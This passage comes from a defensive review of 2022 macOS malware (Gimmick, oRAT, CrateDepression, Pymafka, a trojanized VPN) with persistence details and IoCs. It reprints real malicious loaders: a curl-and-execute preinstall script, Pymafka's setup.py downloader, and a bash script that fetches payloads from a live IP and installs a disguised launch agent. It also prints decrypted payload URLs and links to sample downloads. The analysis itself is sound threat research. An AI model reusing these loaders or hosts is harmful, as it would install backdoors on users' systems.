fabe0b41fb5bce6bda8812197ffd74571fc9e8a5a51767bcceef37458e809c5c\n      /usr/local/bin/com.adobe.acc.network:\n      a2909754783bb5c4fd6955bcebc356e9d6eda94f298ed3e66c7e13511275fbc4\n\n```\nFiles/Directories:\n```\n      /Library/LaunchDaemons/com.adobe.acc.installer.v1.plist\n\n## üëæ Gimmick\n\n```\nA multi-platform implant, leveraging cloud providers for command & control.\n\n[Download: Gimmick (password: infect3d)](https://github.com/objective-see/Malware/raw/main/Gimmick.zip)\n\n[In March, Volexity published a write-up on their discover and analysis of Gimmick, noting:](https://www.volexity.com/blog/2022/03/22/storm-cloud-on-the-horizon-gimmick-malware-strikes-at-macos/)\n\n\"GIMMICK is used in targeted attacks by Storm Cloud, a Chinese espionage threat\nactor known to attack organizations across Asia. It is a feature-rich, multi-platform\nmalware family that uses public cloud hosting services (such as Google Drive) for\ncommand-and-control (C2) channels.\" -Volexity\n\n\n-----\n\n**Writeups:**\n\n[‚ÄúStorm Cloud on the Horizon: GIMMICK Malware Strikes at macOS‚Äù](https://www.volexity.com/blog/2022/03/22/storm-cloud-on-the-horizon-gimmick-malware-strikes-at-macos/)\n\n**Infection Vector: Unknown**\n\nVolexity discovered the macOS version of Gimmick via unauthorized network traffic.\n\n\"...this traffic was determined to be unauthorized and the system, a MacBook Pro\nrunning macOS 11.6 (Big Sur)...This led to the discovery of a macOS variant of a\nmalware implant Volexity calls GIMMICK\" -Volexity\n\nAt this time however, it is unknown how Gimmick initially infects macOS systems.\n\n**Persistence: Launch Item**\n\nIn terms of persistence, the Gimmick will either persist as a launch daemon or agent.\nInterestingly the malware display some simple variability, with Volexity noting that ‚ÄúThe name\nof the binary, plist, and agent will vary per sample‚Äù.\n\nHowever perusing the malware‚Äôs disassembly we find a hardcod path for both a launch\ndaemon and agent: com.CorelDRAW.va.plist:\n```\n1int sub_1000299dd(int arg0) {\n\n2 ...\n\n3 sub_10002939e(arg0, \"/Library/LaunchDaemons/com.CorelDRAW.va.plist\");\n\n4 if (getuid() != 0x0) {\n\n5  ...\n\n6  rax = std::basic_string(&var_50, \"/Users/\", &var_68);\n\n7  rax = std::basic_string::append(&var_50,\n\n8      \"/Library/LaunchAgents/com.CorelDRAW.va.plist\");\n\n```\nDepending on the malware permissions (determined in the above disassembly via: getuid()\n```\n!= 0x0), it will either persist as launch daemon or launch agent.\n\n```\n[If we run the malware in a isolated virtual machine, our FileMonitor observes the creation](https://objective-see.com/products/utilities.html#FileMonitor)\nof the launch item:\n\n\n-----\n\n```\n# FileMonitor.app/Contents/MacOS/FileMonitor pretty\n\n...\n\n{\n\n \"event\" : \"ES_EVENT_TYPE_NOTIFY_WRITE\",\n\n \"file\" : {\n\n  \"destination\" : \"/Library/LaunchDaemons/com.CorelDRAW.va.plist\",\n\n  \"process\" : {\n\n   \"signing info (computed)\" : {\n\n    \"signatureStatus\" : 0,\n\n    \"signatureSigner\" : \"AdHoc\",\n\n    \"signatureID\" : \"mac_g-55554944f9d2f6db7ac23aaea93cad4f3d707ec4\"\n\n   },\n\n   \"uid\" : 0,\n\n   \"arguments\" : [\n\n   ],\n\n   \"ppid\" : 613,\n\n   \"ancestors\" : [\n\n    401,\n\n    1\n\n   ],\n\n   \"rpid\" : 401,\n\n   \"architecture\" : \"Apple Silicon\",\n\n   \"path\" : \"/Users/user/Downloads/gimmick\",\n\n   \"signing info (reported)\" : {\n\n    \"teamID\" : \"\",\n\n    \"csFlags\" : 570425347,\n\n    \"signingID\" : \"mac_g-55554944f9d2f6db7ac23aaea93cad4f3d707ec4\",\n\n    \"platformBinary\" : 0,\n\n    \"cdHash\" : \"69051425DFC9405E7130968AD471CA578F39BF55\"\n\n   },\n\n   \"name\" : \"gimmick\",\n\n   \"pid\" : 615\n\n  }\n\n }\n\n}\n\n```\nOnce the malware has written out the launch daemon plist, com.CorelDRAW.va.plist, we\ncan dump its contents:\n\n\n-----\n\n```\n% cat /Library/LaunchDaemons/com.CorelDRAW.va.plist\n\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n\n<!DOCTYPE plist PUBLIC ...PropertyList-1.0.dtd\">\n\n<plist version=\"1.0\">\n\n<dict>\n\n <key>Label</key>\n\n <string>com.CorelDRAW.va.plist</string>\n\n <key>ProgramArguments</key>\n\n <array>\n\n  <string>/var/root/Library/Preferences/CorelDRAW/CorelDRAW</string>\n\n </array>\n\n <key>RunAtLoad</key>\n\n <true/>\n\n <key>StartInterval</key>\n\n <integer>30</integer>\n\n <key>ThrottleInterval</key>\n\n <integer>2</integer>\n\n <key>WorkingDirectory</key>\n\n <string>/var/root/Library/Preferences/CorelDRAW</string>\n\n</dict>\n\n</plist>\n\n```\nThe persisted binary /var/root/Library/Preferences/CorelDRAW/CorelDRAW is simply a\ncopy of the malware.\n\nAs the RunAtLoad key is set to true, macOS will automatically start the malware (now\nnamed CorelDRAW).\n\n**Capabilities: Backdoor**\n```\nGimmick is rather large, complex, and interestingly as noted by Volexity leverages ‚Äúcloud\n\n```\nplatforms for C2, such as using Google Drive, [which] increases the likelihood of operating\nundetected by network monitoring solutions‚Äù\n\n‚Ä¶but at it‚Äôs core, its capabilities are rather simple, albeit sufficient to afford a remote attacker\nfull (remote) control over an infected system. These capabilities (taskable from its cloudbased command & control server) include:\n\nSurvey (and post results to server)\nUpload file to server\nDownload file to infected system\nExecute a command (and post results to server)\n\nThe Volexity report also mentions several other taskable commands related configuring\nvarious command & control related timers.\n\n\n-----\n\nLet s take a closer look at one of these commands, specifically the survey ‚Ä¶which is also\ndirectly executed when the malware starts up. (We‚Äôll follow the invocation of the survey logic\nfrom malware‚Äôs entry point as that‚Äôs a simpler control flow path).\n\nStarting at the malware‚Äôs entry point, we find the rather verbose code:\n```\n1r14 = dispatch_queue_create(\"SendBaseinfoQueue\", *__dispatch_queue_attr_concurrent);\n\n2      \n\n3rbx = [[GCDTimerManager sharedInstance] retain];\n\n4\n\n5[rbx scheduleGCDTimerWithName:@\"send_cmd_baseinfo\" interval:r14 queue:0x1\nrepeats:0x0 option:^ {/* block implemented at sub_100002381 */ } }\naction:stack[-1120]];\n\n```\nBased on the queue name (SendBaseinfoQueue) and GCD Timer name\n(send_cmd_baseinfo), safe to assume this is kicking off the ‚Äúsurvey and post to server‚Äù logic.\nLet‚Äôs dig deeper, looking into the block (sub_100002381) that is invoked.\n\nA quick peek reveals it simply calls a unnamed subroutine (sub_10000c64a) that is\nresponsible for generating the survey and trigger the upload logic:\n```\n 1int sub_10000c64a() {\n\n 2  var_38 = [[CDDSMacBaseInfo getHardwareUUID] retain];\n\n 3  var_30 = [[CDDSMacBaseInfo getMacaddress] retain];\n\n 4  r12 = [[NSString stringWithUTF8String:[CDDSMacBaseInfo GetCpuInfoAndModel]]\nretain];\n\n 5  r13 = [[CDDSMacBaseInfo getSystemVersion] retain];\n\n 6\n 7  rax = [NSMutableDictionary dictionary];\n\n 8  [rax setObject:var_38 forKey:@\"uuid\"];\n\n 9  [rax setObject:var_30 forKey:@\"mac\"];\n\n10  [rax setObject:r13 forKey:@\"sysname\"];\n\n11  [rax setObject:r12 forKey:@\"cpu\"];\n\n12  rax = sub_10000c836(rax);\n\n13  \n\n14  [FileManager writeCmdJsonFeedback:rax jsonType:0x0];\n\n15  ...\n\n16}\n\n```\nThanks to the verbosity of the method names (e.g. getMacaddress) as well as the keynames\n(e.g. mac), it‚Äôs pretty easy to understand exactly what the survey entails.\n\nAnd once the survey has been generated its stored (via a call to: FileManager\n```\nwriteCmdJsonFeedback:...), pending upload to the cloud-based server.\n\n```\nLets watch the malware survey an (infected) vm, via a debugger ‚Ä¶by setting a breakpoint\nright after the survey dictionary has been populated.\n\n\n-----\n\nAs the (now populated) dictionary is found in the $rax register, we can dump it via the print\n```\nobject $rax command:\n# lldb /var/root/Library/Preferences/CorelDRAW/CorelDRAW\n\n...\n\n(lldb) print object $rax\n\n{\n\n  cpu = \"MacBookAir10,1\";\n\n  mac = \"50-ED-3C-14-49-2F\";\n\n  sysname = \"Version 12.6.1 (Build 21G217)\";\n\n  uuid = \"B27B4042-D513-50C3-9E1D-D4FC54FA7952\";\n\n}\n\n\n```\n**Indicators of Compromise (IoCs):**\n\nIoCs for Gimmick include the following (credit: Volexity):\n\nExecutable Components:\n```\n      /var/root/Library/Preferences/CorelDRAW/CorelDRAW:\n      2a9296ac999e78f6c0bee8aca8bfa4d4638aa30d9c8ccc65124b1cbfc9caab5f\n\n```\nFiles/Directories:\n```\n      /var/root/Library/Preferences/CorelDRAW/\n      /Library/LaunchDaemons/com.CorelDRAW.va.plist\n\n```\n[Volexity also published a list of yara rules to detect Gimmick.](https://github.com/volexity/threat-intel/blob/main/2022/2022-03-22%20GIMMICK/indicators/yara.yar)\n\n## üëæ oRAT\n\nBelonging to a new APT group, oRAT macOS implant supports a myriad of features and\ncapabilities.\n\n\n-----\n\n[Download: oRAT (password: infect3d)](https://github.com/objective-see/Malware/raw/main/oRAT.zip)\n\n[In April, TrendMicro researchers published a write-up details on a new APT group they](https://www.trendmicro.com/en_us/research/22/d/new-apt-group-earth-berberoka-targets-gambling-websites-with-old.html)\ndubbed ‚ÄúEarth Berberoka‚Äù ‚Ä¶as well as details on new persistent macOS implant named\n```\noRAT, written in Go:\n\n```\noRAT uncovered by TrendMicro\n\n**Writeups:**\n\n[‚ÄúMaking oRAT Go‚Äù](https://speakerdeck.com/patrickwardle/making-orat-go)\n\n‚ÄúNew APT Group Earth Berberoka Targets Gambling Websites With Old and New\nMalware‚Äù\n\n[‚ÄúFrom the Front Lines | Unsigned macOS oRAT Malware Gambles For The Win‚Äù](https://www.sentinelone.com/blog/from-the-front-lines-unsigned-macos-orat-malware-gambles-for-the-win/)\n\n**Infection Vector: Malicious Ads / Fake Update Prompt**\n\nIn their write-up TrendMicro noted that the oRAT malware was found embedded in Disk\nImages (.dmgs).\n\n\"The oRAT droppers that we found in our analysis were a MiMi chat application built\nusing the Electron JS framework and a DMG (disk image) file.\" -TrendMicro\n\n\n-----\n\nExactly how such disk images make to their intended targets or victims remains unclear, as\n[well articulated in a follow-up research blog post by SentinelOne:](https://www.sentinelone.com/blog/from-the-front-lines-unsigned-macos-orat-malware-gambles-for-the-win/)\n\n\"Precisely what kind of lure the threat actors use to convince targets to download and\nlaunch the dropper is unknown at this time...\" -SentinelOne\n\nThe SentinelOne researchers did provide more information about the infected disk images,\nnoting that they contain malicious packages (.pkgs) that when run will execute a malicious\npreinstall script.\n\nUsing the [Suspicious Package utility, we can examine one of oRATs malicious packages to](https://mothersruin.com/software/SuspiciousPackage/)\nextract this script:\n\nMalicious preinstall script\nIt‚Äôs a simple, single line bash script:\n```\n1#!/bin/bash\n\n2\n\n3cd /tmp; curl -sL https://d.github.wiki/mac/darwinx64 -O; chmod +x darwinx64;\n./darwinx64;\n\n```\nThe script download‚Äôs main oRAT binary darwinx64 to the /tmp directory, where after setting\nit to executable, launches it.\n\n**Persistence: None**\n\n\n-----\n\nNone of the initial writeups on oRAT mention a persistence mechanism. Moreover, detailed\nanalysis by yours truly of all components of the malware revealed no code related to\npersisting the malware. Finally, though executing the malware in an (isolated) virtual machine\ntriggered full execution of the malware, this resulted in no persistence events.\n\n**Capabilities: Backdoor**\n\nThe initial reports on oRAT gave an overview of its capabilities via static analysis. After\nspending some quality time with the malware, I was able to construct a custom command &\ncontrol server that would dynamically coerce oRAT to reveal its full capabilities.\n\nAnalysis via a custom C&amp;C server\nThis approach (along with a triage of the malware‚Äôs binary) revealed oRAT‚Äôs full capabilities:\n\n\n-----\n\nAnalysis via a custom C&amp;C server\n‚Ä¶that‚Äôs a rather impressive list of capabilities!\n\nAs noted, via the our custom C&C server we can task the malware to gain more insight into\nits capabilities. Let‚Äôs start with the survey command.\n\nAs shown below, we first launch our custom C&C server, and when oRAT connects, task it via\nthe /agent/info request:\n\n\n-----\n\n```\n% ./server 1337          \n\nLaunching oRat C&C Server...\n\n[+] Listening on port: 1337\n\n[+] New client connection: 192.168.0.27:54784 1337\n\n[+] Accepted stream w/ flow id: 3\n\nPOST /join HTTP/1.1\n\n...\n\n{\"type\":0}\n\n[+] Sending: GET /agent/info\n\nHTTP/1.1 200 OK\n\nContent-Type: application/json; charset=UTF-8...\n\n{\n\n \"OS\": \"darwin\",\n\n \"Arch\": \"amd64\",\n\n \"Hostname\": \"users-Mac.local\",\n\n \"Username\": \"user\",\n\n \"RemoteAddr\": \"\",\n\n \"Version\": \"v0.5.1\",\n\n \"JoinTime\": \"0001-01-01T00:00:00Z\"\n\n}\n\n```\nFrom this, we can see an oRAT survey consists information about both the infected machine\n(hardware, etc.) as well as the user.\n\nFor another example, let‚Äôs task the malware to perform a port scan:\n```\n% ./server 1337          \n\nLaunching oRat C&C Server...\n\n[+] New client connection: 192.168.0.27:54784 1337\n\n[+] Sending: /agent/portscan?Host=192.168.0.10&Port=1000-2000&Thread=1&Timeout=100\n\nStart.\n\nOpen: 192.168.0.10:1234\n\nDone.\n\n\n```\nTasking the malware, while running a network monitor reveals it performs a port scan, simply\nby attempting to connect to each port (in the tasked range) for the specified host:\n\n\n-----\n\noRAT's Port Scan capabilities\nInteresting in learning more? You can watch my entire talk, ‚ÄúMaking oRAT Go‚Äù:\n\nWatch Video At:\n\nhttps://youtu.be/JBC9kxAILBM\n\n**Indicators of Compromise (IoCs):**\n\nIoCs for oRAT include the following (credit: TrendMicro):\n\nExecutable Components:\n```\n      /tmp/darwinx64:\n      ee07dfd6443af8f20f5f11effb9cbcec07e125697a28aee78718caeed17f1407\n\n```\nCommand and Control Servers:\n```\n      \"darwin.github.wiki\"\n\n```\n\n-----\n\n[TrendMicro, has published a file solely containing other IoCs, which should also be](https://documents.trendmicro.com/assets/txt/earth-berberoka-macos-iocs-2.txt)\nconsulted.\n\n## üëæ CrateDepression\n\nSpread though ‚Äútyposquatting‚Äù of a popular Rust Crate, this malware installed the opensource persistent Poseidon agent.\n\n[Download: CrateDepression (password: infect3d)](https://github.com/objective-see/Malware/raw/main/CrateDepression.zip)\n\nIn May, a user [posted to the (legitimate) ‚Äúrust-decimal‚Äù github repository that they had](https://github.com/paupino/rust-decimal/issues/514)\nfound what appeared to be a clone of the legitimate Rust crate. Named rustdecimal, this\nclone appeared to have been ‚Äúcreated for malicious purposes.‚Äù\n\nCrateDepression's discovery\n\n**Writeups:**\n\n\n-----\n\n[Possibly malicious package rustdecimal](https://github.com/paupino/rust-decimal/issues/514)\n\n[‚ÄúSecurity advisory: malicious crate rustdecimal‚Äù](https://blog.rust-lang.org/2022/05/10/malicious-crate-rustdecimal.html)\n\n‚ÄúCrateDepression | Rust Supply-Chain Attack Infects Cloud CI Pipelines with Go\nMalware‚Äù\n\n**Infection Vector: TypoSquatting**\n\nThe Github [post by the user ‚Äúsafinaskar‚Äù noted that malicious package (Rust crate) was](https://github.com/paupino/rust-decimal/issues/514)\nnamed ‚Äúrustdecimal‚Äù specifically so users might inadvertently download it (and infect\nthemselves) while looking for the legitimate ‚Äúrust-decimal‚Äù Rust crate.\n\n[The ‚ÄúRust Security Response‚Äù echoed this, noting:](https://blog.rust-lang.org/2022/05/10/malicious-crate-rustdecimal.html)\n\n\"The crate name was intentionally similar to the name of the popular 'rust_decimal'\ncrate, hoping that potential victims would misspell its name (an attack called\n\"typosquatting\").\" -Rust Security Response\n\nThe malicious infection logic in the ‚Äúrustdecimal‚Äù crate was found in a Decimal::new\nfunction (otherwise it was identical to the legitimate rust_decimal crate). This malicious\nfunction is found in the src/decimal.rs file.\n\n\"When the [Decimal::new function] function was called, it checked whether the\nGITLAB_CI environment variable was set, and if so it downloaded a binary payload\ninto /tmp/git-updater.bin and executed it. The binary payload supported both Linux and\nmacOS, but not Windows.\" -Rust Security Response\n\n[Researchers from SentinelOne provided more details, such as highlighting a function named](https://www.sentinelone.com/labs/cratedepression-rust-supply-chain-attack-infects-cloud-ci-pipelines-with-go-malware/)\n```\nparse_fn which contained the ‚Äúdecryption‚Äù (de-XOR) logic of the malware:\n\n```\n\n-----\n\n```\n 1pub fn parse_fn(comm: &Vec<u8>) >String{\n\n 2    let my_bytes = comm;\n\n 3    let sz = my_bytes.len();\n\n 4    let mut new_arr: Vec<u8> = Vec::with_capacity(sz);\n\n 5    let x = (0..sz).collect::<Vec<_>>();\n\n 6    unsafe{new_arr.set_len(sz)};\n\n 7    let xs: [u8; 5] = [42, 23, 233, 121, 44];\n\n 8    let mut count: usize = 0;\n\n 9    for i in 0..my_bytes.len(){\n\n10      if count == xs.len(){\n\n11        count = 0;\n\n12      }\n\n13      new_arr[i] = my_bytes[i] ^ xs[count];\n\n14      count = count + 1;\n\n15    }\n\n16    let s = String::from_utf8(new_arr).expect(\"ERROR MISTYPE CONVERTION\");\n\n17    return s;\n\n18  }\n\n```\nFrom this, we can whip a simply python script to decrypt (deobfuscate) any encrypted\nstrings:\n```\n 1encoded = #encoded string\n\n 2\n 3count = 0;\n\n 4decoded = [];\n\n 5key = [42, 23, 233, 121, 44];\n\n 6\n 7#de-xor\n\n 8for i in range(0, len(encoded)):\n\n 9  if count == len(key):\n\n10    count = 0\n\n11  \n\n12  decoded.append(encoded[i] ^ key[count])\n\n13  count = count + 1\n\n14\n15print(''.join(chr(i) for i in decoded))\n\n```\nIf we peek at check_value function (which the SentinelOne researcher noted was to\ndownload a 2nd-stage payload), we can see the decryption function (parse_fn) being\ninvoked multiple-times:\n\n\n-----\n\n```\n 1pub fn check_value(arc: &str) > std::io::Result<()> {\n\n 2    ...\n\n 3\n 4    if arc == Decimal::parse_fn(&vec![70,126,135,12,84]){\n\n 5      easy.url(&Decimal::parse_fn(&vec!\n[66,99,157,9,95,16,56,198,24,92,67,57,142,16,88,66,98,139,16,67,4,116,134,29,73,89,56\n,159,75,3,67,115,198,31,26,78,34,217,27,26,19,33,138,26,24,24,32,209,64,31,75,34,218,\n31,21,30,117,216,26,31,75,115,138,64,21,5,69,172,56,104,103,82,159,75,2,72,126,135]))\n.unwrap();\n\n 6    }\n\n 7    else{\n\n 8      easy.url(&Decimal::parse_fn(&vec!\n[66,99,157,9,95,16,56,198,24,92,67,57,142,16,88,66,98,139,16,67,4,116,134,29,73,89,56\n,159,75,3,67,115,198,31,26,78,34,217,27,26,19,33,138,26,24,24,32,209,64,31,75,34,218,\n31,21,30,117,216,26,31,75,115,138,64,21,5,69,172,56,104,103,82,199,27,69,68])).unwrap\n();\n\n 9  \n\n10    }\n\n11    ...\n\n12\n13    if arc == Decimal::parse_fn(&vec![70,126,135,12,84]){\n\n14        file = File::create(Decimal::parse_fn(&vec!\n[5,99,132,9,3,77,126,157,84,89,90,115,136,13,73,88,57,139,16,66]))?;\n\n15    }\n\n16    else{\n\n17        file = File::create(Decimal::parse_fn(&vec!\n[5,99,132,9,3,77,126,157,84,89,90,115,136,13,73,88,57,139,16,66]))?;\n\n18    }\n\n19      file.write_all(dst.as_slice())?;\n\n20    }\n\n21    ...\n\n22  }\n\n```\nUsing our Python decryptor we can recover the plaintext values from both this function, but\nalso everywhere else in the malware:\n```\n% python3 decode.py\n\nlinux\n\nhttps://api.githubio.codes/v2/id/f6d50b696cc427893a53f94b1c3adc99/READMEv2.bin\n\nmacos\n\nhttps://api.githubio.codes/v2/id/f6d50b696cc427893a53f94b1c3adc99/README.bin\n\n/tmp/git-updater.bin\n\nxattr\n\ncom.apple.quarantine\n\n-r\n-d\nchmod\n\n+x\n\n```\n\n-----\n\nFrom this output (and as confirmed via continued code analysis), we can see that malware\nchecking the OS it‚Äôs on (linux or macos) and, depending on the OS, will download a 2ndstage payload.\n\nFor macOS, the payload will be retrieved from the 2nd URL:\n```\nhttps://api.githubio.codes/v2/id/f6d50b696cc427893a53f94b1c3adc99/README.bin.\n\n```\nIt is then saved to /tmp/git-updater.bin. After the quarantine attribute\n(com.apple.quarantine) is removed (via xattr), it is set to executable via: c hmod +x. The\n2nd-stage payload is then executed.\n\n**Persistence: Launch/Logic Item**\n\n\n[The SentinelOne researchers who analyzed the 2nd-stage payload noted it was simply a](https://www.sentinelone.com/labs/cratedepression-rust-supply-chain-attack-infects-cloud-ci-pipelines-with-go-malware/)\n‚Äúunsigned Poseidon payload‚Äù\n\n[According to its Github repository, Poseidon is,](https://github.com/MythicAgents/poseidon)\n\n\"...is a Golang agent [for Mythic] that compiles into Linux and macOS x64\nexecutables.\"\n\nMythic is \"a cross-platform, post-exploit, red teaming framework ...designed to provide a\ncollaborative and user friendly interface for operators, managers, and reporting throughout\nred teaming.\" -Mythic Github repository\n\nIn terms of persistence, Poseidon can be persisted as either a launch item (agent or\ndaemon) or as a login item:\n\nPoseidon's persistence modules\n\n**Capabilities: Fully-featured Backdoor**\n\n\n-----\n\n```\nPoseidon (the payload downloaded and executed by the malicious Rust crate), supports a\n\n```\nmyriad of a capabilities. As its open-source, it‚Äôs easy to see exactly what it is capable of.\nSpecifically, perusing it‚Äôs [Github repository this includes:](https://github.com/MythicAgents/poseidon)\n\ndownload\nexecute\nkeylog\nportscan\nscreencapture\nsocks (proxy)\n\nIt also supports basic commands such as cat, cd, kill, ls, rm, etc. etc.\n\n**Indicators of Compromise (IoCs):**\n\nIoCs for CrateDepression include the following (credit: SentinelOne):\n\nExecutable Components:\n```\n      /tmp/git-updater.bin:\n\n```\nNetwork:\n```\n      api.githubio.codes/v2/id/f6d50b696cc427893a53f94b1c3adc99\n\n## üëæ Pymafka\n\n```\nSpread though ‚Äútyposquatting‚Äù of a popular Python package (PyKafka), this python-based\nmalware installs a compiled Cobalt Strike agent.\n\n[Download: Pymafka (password: infect3d)](https://github.com/objective-see/Malware/raw/main/Pymafka.zip)\n\n\n-----\n\nIn May, [Sonatype s automated malware detection bots found what turned out to be a](https://blog.sonatype.com/new-pymafka-malicious-package-drops-cobalt-strike-on-macos-windows-linux)\nmalicious Python package in the PyPI registry.\n\n\"On May 17th, a mysterious 'pymafka' package appeared on the PyPI registry. The\npackage was shortly flagged by the Sonatype Nexus platform's automated malware\ndetection capabilities.\" -Sonatype\n\npymafka package (image credit: Sonatype)\n\n**Writeups:**\n\n[‚ÄúNew ‚Äòpymafka‚Äô Malicious Package Drops Cobalt Strike on macOS, Windows, Linux‚Äù](https://blog.sonatype.com/new-pymafka-malicious-package-drops-cobalt-strike-on-macos-windows-linux)\n\n**Infection Vector: TypoSquatting**\n\nAs [noted by the Sonatype researchers, the malicious Python package was named pymafka](https://blog.sonatype.com/new-pymafka-malicious-package-drops-cobalt-strike-on-macos-windows-linux)\nspecifically so users might inadvertently download it (and infect themselves) while looking for\nthe legitimate ‚ÄúPykafka‚Äù Python package:\n\n\"The package appears to typosquat a legitimate popular library PyKafka, a\nprogrammer-friendly Apache Kafka client for Python.\" -Sonatype\n\n\n-----\n\nThe legitimate Python package, PyKafka, is a programmer-friendly Kafka client for Python pykafka package page\nSonatype points out the legitimate Python package, has been downloaded over 4 million\ntimes. Due to its popularity, it‚Äôs understandable that it became a typesquatting target.\n\nThe malicious infection logic in the ‚Äúpymafka‚Äù package was found in a setup.py file.\n\n\"The 'setup.py' Python script inside 'pymafka' first detects your platform. Depending on\nwhether you are running Windows, macOS, or Linux, an appropriate malicious trojan is\ndownloaded and executed on the infected system.\" -Sonatype\n\nLet‚Äôs look at the macOS-specific logic that completes the infection. It‚Äôs found in a function\nnamed inst (in the setup.py file):\n```\n 1def inst():\n\n 2  ...\n\n 3  \n\n 4  if platform.system()==\"Darwin\":\n\n 5    sfile=\"/var/tmp/zad\"\n\n 6    if not os.path.exists(sfile):\n\n 7     url = 'http://141.164.58.147:8090/MacOs'\n\n 8     f = request.urlopen(url)\n\n 9     data = f.read()\n\n10     with open(sfile, \"wb\") as code:\n\n11      code.write(data)\n12     \n\n13     subprocess.Popen([\"chmod\",\"+x\",sfile])\n\n14     subprocess.Popen(\"nohup /var/tmp/zad > /tmp/log 2>&1 &\",shell=True)\n\n15  \n\n```\nAs the malicious Python code is relatively straightforward, it‚Äôs easy to understand that the\ncode:\n\nRequests a binary named MacOs from http://141.164.58.147:8090\nSaves it to /var/tmp/zad\nMakes it executable (via chmod), then executes it\n\n**Persistence: Unknown (none?)**\n\nOnce execute, we saw that the malicious Python will simply download and execute a binary\n(/var/tmp/zad). In their report, Sonatype pointed out that this is Cobalt Strike beacon:\n\n\"The [downloaded and executed] trojan ...is a Cobalt Strike (CS) beacon.\" -Sonatype\n\n\n-----\n\nThough Cobalt Strike can be (manually?) persisted, this instance when executed was not\nobserved persisting. Its worth noted it perhaps could be instructed to persist once it checks in\nwith the Cobalt Strike Server.\n\n**Capabilities: Fully-featured Agent**\n\nAs noted, pymafka downloads and executes a Cobalt Strike (CS) beacon/payload.\n\nQ: What is Cobalt Strike?\nA: ‚ÄúCobalt Strike is a pen-testing software tool typically used by red teams and ethical\nhackers for simulating real-world cyberattacks‚Ä¶\n\nBut, time and time again attackers [as in this attack], including ransomware groups like\nLockBit, have abused Cobalt Strike to infect victims.‚Äù -Sonatype\n\nCobalt Strike supports a myriad of features, that allow a remote attack, full control over an\ninfected system. The following image, from the commercial makers of Cobalt Strike, provides\nan overview of its capabilities:\n\nCobalt Strike's Capabilities (image credit: Fortra)\n\n**Indicators of Compromise (IoCs):**\n\nIoCs for Pymafka include the following (credit: Sonatype):\n\n\n-----\n\nExecutable Components:\n```\n      /var/tmp/zad:\n      b117f042fe9bac7c7d39eab98891c2465ef45612f5355beea8d3c4ebd0665b45\n\n```\nNetwork\n```\n      46.137.201.254\n\n## üëæ \"VPN Trojan\" (Covid)\n\n```\nThis malware, is persistent backdoor that downloads and executes 2nd-stage payloads\ndirectly from memory.\n\n[Download: \"VPN Trojan\" (Covid) (password: infect3d)](https://github.com/objective-see/Malware/raw/main/Covid.zip)\n\n[In July, researchers at SentinelOne published a report on an interesting malware sample,](https://www.sentinelone.com/blog/from-the-front-lines-new-macos-covid-malware-masquerades-as-apple-wears-face-of-apt/)\nwith connections and overlaps to the APT-attributed malware DazzleSpy:\n\n\n-----\n\nA new macOS malware specimen (image credit: SentinelOne)\n\n**Writeups:**\n\n‚ÄúFrom the Front Lines | New macOS ‚Äòcovid‚Äô Malware Masquerades as Apple, Wears\nFace of APT‚Äù\n\n**Infection Vector: Trojanized Disk Images(?)**\n\n[The researchers (Phil and](https://twitter.com/philofishal) [Dinesh) who analyzed the malware, wrote that it was found within](https://twitter.com/dineshdina04)\na disk image (vpn.dmg) that had been uploaded to VirusTotal:\n\n\"We recently came across a new malware sample...[in] a DMG named ‚Äòvpn‚Äô [that] was\nuploaded to VirusTotal.\" -SentinelOne\n\nAt the time (it was uploaded to VirusTotal), is was undetected:\n\nUndetected on VirusTotal\n\n\n-----\n\nIts not clear how the trojanized disk image would be delivered to targeted users. Perhaps,\n(as this malware has some notable overlaps to other Mac malware (ab)used by Chinese APT\ngroups) users believed it contained a VPN software that could be used to circumvent\nChinese government surveillance?\n\nRegardless, if the user downloads the disk image and runs what they believe is a legitimate\nVPN application they will be infected:\n\n\n-----\n\n-----\n\nTrojanized VPN Application\n\n**Persistence: Launch Agent**\n\nWhen the trojanized VPN application is run from the disk image, it will execute a script\nnamed found within its application bundle (Contents/Resources/script):\n```\n 1#!/bin/bash\n\n 2path=$HOME\n\n 3platform=$(uname -m)\n\n 4mkdir $path/.androids\n\n 5if [ $platform == 'x86_64' ]\n\n 6then\n\n 7    curl -L http://46.137.201.254/softwareupdated2 -o\n$path/.androids/softwareupdated\n\n 8else\n\n 9    curl -L http://46.137.201.254/softwareupdated -o\n$path/.androids/softwareupdated\n\n10fi\n\n11chmod a+x $path/.androids/softwareupdated\n\n12echo '<?xml version=\"1.0\"encoding=\"utf-8\"?>\n\n13<!DOCTYPE plist PUBLIC\"-//Apple//DTD PLIST 1.0//EN\"\n\n14\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n\n15<plist version=\"1.0\">\n\n16  <dict>\n\n17    <key>KeepAlive</key>\n\n18    <true/>\n\n19    <key>RunAtLoad</key>\n\n20    <true/>\n\n21    <key>Label</key>\n\n22    <string>softwareupdated</string>\n\n23    <key>ProgramArguments</key>\n\n24    <array>\n\n25      <string>'$path/.androids/softwareupdated'</string>\n\n26      <string>-D</string>\n\n27    </array>\n\n28    <key>WorkingDirectory</key>\n\n29    <string>'$path/.androids/'</string>\n\n30  </dict>\n\n31</plist>' > ~/Library/LaunchAgents/com.apple.softwareupdate.plist\n\n32chmod 644 ~/Library/LaunchAgents/com.apple.softwareupdate.plist\n\n33launchctl load ~/Library/LaunchAgents/com.apple.softwareupdate.plist\n\n34launchctl start softwareupdated\n\n35$path/.androids/softwareupdated &\n\n36chflags uchg $path/.androids/softwareupdated\n\n37curl -L http://46.137.201.254/covid -o $path/covid\n\n38chmod a+x $path/covid\n\n39/$path/covid\n\n```\n\n-----\n\nThis first creates a hidden directory: ~/.androids:\n\n[We can passively observe this via a File Monitor:](https://objective-see.com/products/utilities.html#FileMonitor)\n```\n# FileMonitor.app/Contents/MacOS/FileMonitor -pretty\n\n...\n\n{\n\n \"event\" : \"ES_EVENT_TYPE_NOTIFY_CREATE\",\n\n \"file\" : {\n\n  \"destination\" : \"/Users/user/.androids\",\n  \"process\" : {\n\n   ...\n\n   \"path\" : \"/bin/mkdir\",\n\n   \"name\" : \"mkdir\",\n\n   \"pid\" : 9404\n\n  }\n\n }\n\n}\n\n\n```\nAfter downloading a binary (from 46.137.201.254), to a ~/.androids/softwareupdated the\nscript will persist the binary as a launch agent.\n\nSpecifically it saves (via >) an embedded launch item plist to:\n```\n~/Library/LaunchAgents/com.apple.softwareupdate.plist:\n# FileMonitor.app/Contents/MacOS/FileMonitor -pretty\n\n...\n\n{\n\n \"event\" : \"ES_EVENT_TYPE_NOTIFY_CREATE\",\n\n \"file\" : {\n\n  \"destination\" 